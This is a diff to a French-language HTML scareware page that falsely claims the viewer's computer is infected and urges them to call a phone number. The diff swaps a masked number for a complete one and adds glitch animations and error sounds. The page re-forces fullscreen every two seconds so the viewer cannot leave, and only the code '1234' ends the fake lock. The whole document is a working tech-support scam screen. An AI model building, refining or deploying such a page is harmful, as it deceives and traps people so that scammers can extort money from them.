@@ -17,7 +17,7 @@
             height: 100vh;
             background: black;
             color: white;
-            font-family: Arial, sans-serif;
+            font-family: 'Courier New', Courier, monospace;
             text-align: center;
             overflow: hidden;
             display: flex;
@@ -57,33 +57,65 @@
             color: red;
             font-size: 2vw;
             margin-top: 10px;
+            animation: shake 0.5s;
+            animation-iteration-count: 1;
+        }
+        @keyframes shake {
+            0% { transform: translateX(0); }
+            25% { transform: translateX(-5px); }
+            50% { transform: translateX(5px); }
+            75% { transform: translateX(-5px); }
+            100% { transform: translateX(0); }
+        }
+        .glitch {
+            position: relative;
+            color: white;
+            font-size: 3vw;
+            animation: glitch 1s infinite;
+        }
+        @keyframes glitch {
+            0% {
+                text-shadow: 2px 2px red, -2px -2px blue;
+            }
+            25% {
+                text-shadow: -2px 2px red, 2px -2px blue;
+            }
+            50% {
+                text-shadow: 2px -2px red, -2px 2px blue;
+            }
+            75% {
+                text-shadow: -2px -2px red, 2px 2px blue;
+            }
+            100% {
+                text-shadow: 2px 2px red, -2px -2px blue;
+            }
         }
     </style>
 </head>
 <body>
-
     <div class="container">
-        <p class="message">⚠️ Votre ordinateur est infecté ⚠️<br>Appelez immédiatement :</p>
-        <p class="alert-number">+33 6 XX XX XX 09</p>
+        <p class="message">  Votre ordinateur est infecté  <br>Appelez immédiatement :</p>
+        <p class="alert-number">+33 7 56 75 43 88</p>
         <p style="font-size: 3vw;">Entrez le code de déverrouillage :</p>
         <input type="password" id="codeInput" placeholder="Code secret">
-        <p id="error-message"></p>
+        <p id="error-message" class="glitch"></p>
     </div>
-
     <audio id="keypress-sound">
         <source src="https://www.soundjay.com/button/beep-07.wav" type="audio/wav">
     </audio>
-
+    <audio id="error-sound">
+        <source src="https://www.soundjay.com/button/beep-10.wav" type="audio/wav">
+    </audio>
     <script>
         function openFullscreen() {
             let elem = document.documentElement;
             if (elem.requestFullscreen) {
                 elem.requestFullscreen();
-            } else if (elem.mozRequestFullScreen) { 
+            } else if (elem.mozRequestFullScreen) {
                 elem.mozRequestFullScreen();
-            } else if (elem.webkitRequestFullscreen) { 
+            } else if (elem.webkitRequestFullscreen) {
                 elem.webkitRequestFullscreen();
-            } else if (elem.msRequestFullscreen) { 
+            } else if (elem.msRequestFullscreen) {
                 elem.msRequestFullscreen();
             }
         }
@@ -134,6 +166,7 @@
         let inputField = document.getElementById("codeInput");
         let errorMessage = document.getElementById("error-message");
         let sound = document.getElementById("keypress-sound");
+        let errorSound = document.getElementById("error-sound");
 
         inputField.addEventListener("keydown", function(event) {
             if (!["Enter", "Backspace"].includes(event.key)) {
@@ -144,10 +177,14 @@
         // Vérifier le code
         inputField.addEventListener("keyup", function(event) {
             if (event.key === "Enter") {
-                if (this.value === "1234") {  
-                    document.body.innerHTML = "<h1 style='color: white; text-align: center; margin-top: 20%; font-size: 5vw;'>✅ Système restauré</h1>";
+                if (this.value === "1234") {
+                    document.body.innerHTML = "<h1 style='color: white; text-align: center; margin-top: 20%; font-size: 5vw;'>  Système restauré</h1>";
                 } else {
                     errorMessage.innerText = "Code incorrect !";
+                    errorMessage.classList.remove("glitch");
+                    void errorMessage.offsetWidth; // Reset animation
+                    errorMessage.classList.add("glitch");
+                    errorSound.play();
                     this.value = "";
                 }
             }
@@ -160,8 +197,6 @@
 
         // Reforcer le plein écran toutes les 2 secondes
         setInterval(openFullscreen, 2000);
-
     </script>
-
 </body>
 </html>
